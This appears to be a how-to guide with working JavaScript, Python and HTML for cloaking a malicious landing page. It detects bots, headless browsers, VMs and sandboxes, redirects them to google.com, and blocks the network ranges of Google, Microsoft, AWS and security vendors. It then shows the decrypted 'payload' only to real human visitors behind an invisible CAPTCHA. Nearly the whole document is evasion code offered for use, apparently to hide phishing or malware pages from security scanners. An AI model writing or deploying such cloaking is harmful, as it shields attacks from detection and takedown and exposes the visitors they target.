# Anti-Bot, Anti-Sandbox & Environment Detection

Apply all checks BEFORE rendering sensitive content.

```javascript
(function(){
    var dominated = false;

    // 1. Automation flags
    if (navigator.webdriver) dominated = true;
    if (window._phantom || window.__nightmare) dominated = true;
    if (!window.chrome && /Chrome/.test(navigator.userAgent)) dominated = true;

    // 2. Headless indicators
    if (!navigator.plugins.length) dominated = true;
    if (navigator.languages === undefined || navigator.languages.length === 0) dominated = true;
    if (navigator.hardwareConcurrency < 2) dominated = true;

    // 3. WebGL renderer — VM/sandbox detection
    try {
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl');
        var ext = gl.getExtension('WEBGL_debug_renderer_info');
        var renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL).toLowerCase();
        if (/swiftshader|llvmpipe|mesa|vmware|virtualbox/.test(renderer)) dominated = true;
    } catch(e) { dominated = true; }

    // 4. Screen/memory checks
    if (screen.width < 800 || screen.height < 600) dominated = true;
    if (navigator.deviceMemory && navigator.deviceMemory < 2) dominated = true;

    // 5. CDP detection (Puppeteer/Playwright traces)
    if (window.cdc_adoQpoasnfa76pfcZLmcfl_Array ||
        window.cdc_adoQpoasnfa76pfcZLmcfl_Promise) dominated = true;

    // 6. CDP serialization detection (advanced)
    var cdpDetected = false;
    var marker = new Error();
    Object.defineProperty(marker, 'stack', {
        get: function() { cdpDetected = true; }
    });
    console.debug(marker);
    if (cdpDetected) dominated = true;

    // 7. Mouse movement check (3s timeout)
    var hasMouse = false;
    document.addEventListener('mousemove', function(){ hasMouse = true; });

    setTimeout(function(){
        if (dominated || !hasMouse) {
            window.location = 'https://google.com';
            return;
        }
        loadContent();
    }, 3000);

    function loadContent() {
        // decrypt and render actual payload here
    }
})();
```

| Check | Catches | Bypass difficulty |
|-------|---------|-------------------|
| `navigator.webdriver` | Selenium, Puppeteer, Playwright | Easy (flag removal) |
| `navigator.plugins.length === 0` | Headless Chrome, VMs | Medium |
| `navigator.languages.length === 0` | Bots without locale | Easy |
| `hardwareConcurrency < 2` | Single-core VMs | Easy |
| WebGL renderer (SwiftShader/llvmpipe) | Docker, headless, VMs without GPU | Hard (need GPU passthrough) |
| `screen.width/height` | Small VM screens | Easy |
| `deviceMemory < 2` | Low-memory VMs | Easy |
| CDP artifacts (`cdc_` prefixes) | Puppeteer/Chromedriver | Medium (patched Chrome) |
| CDP serialization (getter trap) | Any CDP-based automation | Hard (need non-CDP tools) |
| Mouse movement | All automated tools | Hard (need ghost-cursor) |

## Server-Side Cloaking (IP/ASN filter)

```python
BLOCKED_ASNS = ['AS15169', 'AS396982', 'AS8075', 'AS16509', 'AS14618']  # Google, Microsoft, AWS

@app.route('/<token>')
def landing(token):
    visitor_asn = get_asn(request.remote_addr)  # via ipinfo.io or local MaxMind
    if visitor_asn in BLOCKED_ASNS:
        return redirect('https://google.com')
    if not is_valid_token(token):
        return '', 404
    return render_obfuscated_page(token)
```

Block: Google (AS15169, AS396982), Microsoft (AS8075), AWS (AS16509, AS14618), known security vendors.
Also check UA for: Googlebot, facebookexternalhit, bot, crawler, spider, scanner.
Cloudflare Workers: `request.cf.asOrganization`, `request.cf.country`.

## CAPTCHA Gating (Turnstile)

Free, invisible mode, built-in bot filtering.

**Client:**
```html
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" defer></script>
<div id="cf-turnstile"></div>
<div id="content">Loading...</div>
<script>
turnstile.render('#cf-turnstile', {
    sitekey: 'SITE_KEY',
    appearance: 'interaction-only',
    callback: function(token) {
        fetch('/api/unlock', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({token: token})
        })
        .then(r => r.json())
        .then(data => {
            decryptAndRender(data.payload, data.key);
        });
    }
});
</script>
```

**Server validates token:**
```python
def validate_turnstile(token, ip):
    r = requests.post('https://challenges.cloudflare.com/turnstile/v0/siteverify', json={
        'secret': TURNSTILE_SECRET,
        'response': token,
        'remoteip': ip
    })
    return r.json().get('success', False)
```

Token single-use, expires 300s. Valid → return decryption key; invalid → 403.
